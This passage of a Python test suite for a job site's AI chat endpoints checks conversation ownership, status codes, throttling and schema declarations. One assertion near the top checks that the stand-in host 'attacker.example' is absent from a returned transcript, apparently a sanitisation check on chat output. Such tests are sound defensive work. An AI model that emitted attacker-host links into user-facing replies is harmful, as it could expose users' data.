            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
        self.assertNotIn("attacker.example", out["messages"][1]["content"])

    def test_another_users_conversation_is_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.models import Conversation
        from apps.ai.services import get_conversation_messages
        intruder = UserAccount.objects.create_user(
            email="nosy3@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        mine = Conversation.objects.create(user=self.seeker, title="private")
        with self.assertRaises(ConversationNotFoundError):
            get_conversation_messages(intruder, conversation_id=str(mine.id),
                                      checkpointer=self._saver())

    def test_unknown_and_malformed_ids_raise_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.services import get_conversation_messages
        for bad in ("00000000-0000-0000-0000-000000000000", "nope"):
            with self.subTest(conversation_id=bad):
                with self.assertRaises(ConversationNotFoundError):
                    get_conversation_messages(self.seeker, conversation_id=bad,
                                              checkpointer=self._saver())

    def test_conversation_with_no_turns_returns_an_empty_list(self):
        from apps.ai.models import Conversation
        from apps.ai.services import get_conversation_messages
        conversation = Conversation.objects.create(user=self.seeker, title="empty")
        out = get_conversation_messages(
            self.seeker, conversation_id=str(conversation.id),
            checkpointer=self._saver())
        self.assertEqual(out["messages"], [])


class ChatEndpointTests(_ChatServiceFixture, APITestCase):
    URL = "/api/v1/ai/chat/"

    def _post(self, payload, patched_return=None, side_effect=None):
        _auth(self.client, self.seeker)
        with patch("apps.ai.views.services.send_chat_message") as send:
            if side_effect is not None:
                send.side_effect = side_effect
            else:
                send.return_value = patched_return or {
                    "conversation_id": "11111111-1111-1111-1111-111111111111",
                    "reply": "hello"}
            return self.client.post(self.URL, payload, format="json"), send

    def test_returns_conversation_id_and_reply(self):
        """The service is mocked here — this is routing/pass-through coverage
        only, not end-to-end coverage of what send_chat_message computes or
        sanitizes. That lives in SendChatMessageTests."""
        response, _ = self._post({"message": "hi"})
        self.assertEqual(response.status_code, 200)
        self.assertEqual(set(response.data), {"conversation_id", "reply"})

    def test_passes_conversation_id_through(self):
        cid = "22222222-2222-2222-2222-222222222222"
        _, send = self._post({"message": "hi", "conversation_id": cid})
        self.assertEqual(send.call_args.kwargs["conversation_id"], cid)

    def test_missing_message_is_400(self):
        _auth(self.client, self.seeker)
        self.assertEqual(self.client.post(self.URL, {}, format="json").status_code, 400)

    def test_blank_message_is_400(self):
        _auth(self.client, self.seeker)
        self.assertEqual(self.client.post(
            self.URL, {"message": "   "}, format="json").status_code, 400)

    def test_anonymous_is_401(self):
        self.assertEqual(self.client.post(
            self.URL, {"message": "hi"}, format="json").status_code, 401)

    def test_company_user_is_403(self):
        _auth(self.client, self.company_user)
        self.assertEqual(self.client.post(
            self.URL, {"message": "hi"}, format="json").status_code, 403)

    def test_conversation_not_found_is_404(self):
        from apps.ai.exceptions import ConversationNotFoundError
        response, _ = self._post({"message": "hi"},
                                 side_effect=ConversationNotFoundError)
        self.assertEqual(response.status_code, 404)
        self.assertIn("error", response.data)

    def test_agent_limit_is_504(self):
        from apps.ai.exceptions import AgentLimitExceededError
        response, _ = self._post({"message": "hi"},
                                 side_effect=AgentLimitExceededError)
        self.assertEqual(response.status_code, 504)
        self.assertIn("error", response.data)

    def test_conversation_exhausted_is_409_and_says_start_a_new_one(self):
        """Distinct from the 504: this thread can never answer again, so
        'try a simpler question' would be false and unactionable."""
        from apps.ai.exceptions import ConversationExhaustedError
        response, _ = self._post({"message": "hi"},
                                 side_effect=ConversationExhaustedError)
        self.assertEqual(response.status_code, 409)
        self.assertIn("new", response.data["error"].lower())

    def test_provider_error_is_502(self):
        from apps.ai.exceptions import AIProviderError
        response, _ = self._post({"message": "hi"}, side_effect=AIProviderError)
        self.assertEqual(response.status_code, 502)

    def test_quota_error_is_429(self):
        from apps.ai.exceptions import AIQuotaExceededError
        response, _ = self._post({"message": "hi"}, side_effect=AIQuotaExceededError)
        self.assertEqual(response.status_code, 429)
        self.assertIn("error", response.data)

    def test_lists_all_four_throttle_classes(self):
        """Overriding throttle_classes REPLACES the defaults. Test settings
        raise every rate to 100000/day, so only this assertion can catch a
        dropped class."""
        from rest_framework.throttling import AnonRateThrottle, UserRateThrottle
        from jobApp.throttling import BurstRateThrottle
        from apps.ai.throttling import AIChatRateThrottle
        from apps.ai import views
        self.assertEqual(
            list(views.chat.cls.throttle_classes),
            [AnonRateThrottle, UserRateThrottle, BurstRateThrottle, AIChatRateThrottle])

    def test_chat_throttle_uses_the_ai_chat_scope(self):
        from apps.ai.throttling import AIChatRateThrottle
        self.assertEqual(AIChatRateThrottle.scope, "ai-chat")


class ChatConversationsEndpointTests(_ChatServiceFixture, APITestCase):
    URL = "/api/v1/ai/chat/conversations/"

    def _conversation(self):
        from apps.ai.models import Conversation
        return Conversation.objects.create(user=self.seeker, title="mine")

    def test_lists_own_conversations(self):
        self._conversation()
        _auth(self.client, self.seeker)
        response = self.client.get(self.URL)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(response.data), 1)
        self.assertEqual(set(response.data[0]), {"id", "title", "created_at"})

    def test_never_lists_another_users_conversations(self):
        from apps.ai.models import Conversation
        other = UserAccount.objects.create_user(
            email="other3@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        Conversation.objects.create(user=other, title="theirs")
        _auth(self.client, self.seeker)
        self.assertEqual(self.client.get(self.URL).data, [])

    def test_list_anonymous_is_401(self):
        self.assertEqual(self.client.get(self.URL).status_code, 401)

    def test_list_company_user_is_403(self):
        _auth(self.client, self.company_user)
        self.assertEqual(self.client.get(self.URL).status_code, 403)

    def test_delete_returns_204_and_passes_the_conversation_id(self):
        """The service is mocked here — end-to-end deletion (row + checkpointer
        thread) is covered by DeleteConversationTests, where an InMemorySaver
        can be injected."""
        conversation = self._conversation()
        _auth(self.client, self.seeker)
        with patch("apps.ai.views.services.delete_conversation") as delete:
            response = self.client.delete(f"{self.URL}{conversation.id}/")
        self.assertEqual(response.status_code, 204)
        self.assertEqual(delete.call_args.kwargs["conversation_id"],
                         str(conversation.id))

    def test_delete_unknown_is_404(self):
        from apps.ai.exceptions import ConversationNotFoundError
        _auth(self.client, self.seeker)
        with patch("apps.ai.views.services.delete_conversation",
                   side_effect=ConversationNotFoundError):
            response = self.client.delete(
                f"{self.URL}00000000-0000-0000-0000-000000000000/")
        self.assertEqual(response.status_code, 404)
        self.assertIn("error", response.data)

    def test_delete_anonymous_is_401(self):
        self.assertEqual(self.client.delete(
            f"{self.URL}00000000-0000-0000-0000-000000000000/").status_code, 401)

    def test_delete_company_user_is_403(self):
        _auth(self.client, self.company_user)
        self.assertEqual(self.client.delete(
            f"{self.URL}00000000-0000-0000-0000-000000000000/").status_code, 403)

    def test_transcript_returns_the_messages(self):
        """The service is mocked here — this is routing/pass-through coverage
        only, not end-to-end coverage of how the transcript is assembled
        (role split, sanitization). That lives in GetConversationMessagesTests."""
        conversation = self._conversation()
        _auth(self.client, self.seeker)
        payload = {"id": str(conversation.id), "title": "mine",
                   "created_at": "2026-08-01T00:00:00+00:00",
                   "messages": [{"role": "user", "content": "hi"}]}
        with patch("apps.ai.views.services.get_conversation_messages",
                   return_value=payload):
            response = self.client.get(f"{self.URL}{conversation.id}/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data["messages"][0]["role"], "user")

    def test_transcript_unknown_is_404(self):
        from apps.ai.exceptions import ConversationNotFoundError
        _auth(self.client, self.seeker)
        with patch("apps.ai.views.services.get_conversation_messages",
                   side_effect=ConversationNotFoundError):
            response = self.client.get(
                f"{self.URL}00000000-0000-0000-0000-000000000000/")
        self.assertEqual(response.status_code, 404)

    def test_transcript_anonymous_is_401(self):
        self.assertEqual(self.client.get(
            f"{self.URL}00000000-0000-0000-0000-000000000000/").status_code, 401)

    def test_transcript_company_user_is_403(self):
        _auth(self.client, self.company_user)
        self.assertEqual(self.client.get(
            f"{self.URL}00000000-0000-0000-0000-000000000000/").status_code, 403)

    def test_management_endpoints_use_the_house_throttle_trio(self):
        """These consume no tokens, so the four-class AI rule does not apply."""
        from rest_framework.throttling import AnonRateThrottle, UserRateThrottle
        from jobApp.throttling import BurstRateThrottle
        from apps.ai import views
        expected = [AnonRateThrottle, UserRateThrottle, BurstRateThrottle]
        self.assertEqual(list(views.list_conversations.cls.throttle_classes), expected)
        self.assertEqual(list(views.conversation_detail.cls.throttle_classes), expected)


class ChatSchemaTests(_ChatServiceFixture, APITestCase):
    PATH = "/api/v1/ai/chat/"

    def _schema(self):
        from drf_spectacular.generators import SchemaGenerator
        return SchemaGenerator().get_schema(request=None, public=True)

    def test_declares_its_error_envelopes_honestly(self):
        schema = self._schema()
        for status_code, expected in ((401, [["detail"]]), (403, [["detail"]]),
                                      (404, [["error"]]), (409, [["error"]]),
                                      (504, [["error"]])):
            with self.subTest(status=status_code):
                self.assertEqual(
                    _schema_error_shapes(schema, self.PATH, status_code), expected)

    def test_429_declares_both_shapes(self):
        self.assertEqual(_schema_error_shapes(self._schema(), self.PATH, 429),
                         [["detail"], ["error"]])

    def test_200_declares_the_reply_contract(self):
        schema = self._schema()
        body = schema["paths"][self.PATH]["post"]["responses"]["200"]
        ref = body["content"]["application/json"]["schema"]["$ref"].rsplit("/", 1)[-1]
        self.assertEqual(sorted(schema["components"]["schemas"][ref]["properties"]),
                         ["conversation_id", "reply"])

    def test_get_and_delete_do_not_cross_declare_responses(self):
        """GET and DELETE share one view function (conversation_detail). A
        single shared @extend_schema(responses=...) would make the schema
        claim DELETE can return the 200 transcript body and GET can return
        204 — neither is true, so each method now carries its own decorator."""
        schema = self._schema()
        detail = schema["paths"]["/api/v1/ai/chat/conversations/{conversation_id}/"]
        self.assertIn("200", detail["get"]["responses"])
        self.assertNotIn("204", detail["get"]["responses"])
        self.assertIn("204", detail["delete"]["responses"])
        self.assertNotIn("200", detail["delete"]["responses"])
